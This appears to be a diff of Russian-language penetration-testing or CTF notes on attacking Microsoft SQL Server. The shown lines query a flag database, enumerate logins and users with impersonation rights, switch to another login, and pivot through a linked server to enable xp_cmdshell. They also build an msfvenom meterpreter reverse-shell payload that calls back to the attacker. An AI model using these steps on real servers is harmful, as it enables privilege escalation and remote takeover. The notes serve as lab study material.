@@ -130,10 +130,14 @@ exec xp_dirtree 'c:/';
        USE flagDB;
        SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = 'flagDB';
        SELECT * FROM tb_flag;
+* Проверить залогиненных пользователей
 
+  enum_logins                - enum login users
+  
 * Проверить есть ли пользователи с правами олицетворения
 
       SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 
+
 * Давайте переключимся на пользователя john и проверьте его привилегии.
 
        EXECUTE AS LOGIN = 'john';
@@ -165,7 +169,9 @@ exec xp_dirtree 'c:/';
 
         describe wp_users; (описать таблицу)
 
-это интересно!!!  ПЕРЕЧИСЛЕНИЕ СВЯЗАННХ СЕРВЕРОВ                  enum_links                 - enum linked servers
+это интересно!!!  ПЕРЕЧИСЛЕНИЕ СВЯЗАННХ СЕРВЕРОВ                    
+                                                                    enum_links                 - enum linked servers
+                                                                   
                                                                     use_link "DC02.darkzero.ext"
                                                                     enable_xp_cmdshell
                                                                     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4242 -f exe -o s.exe
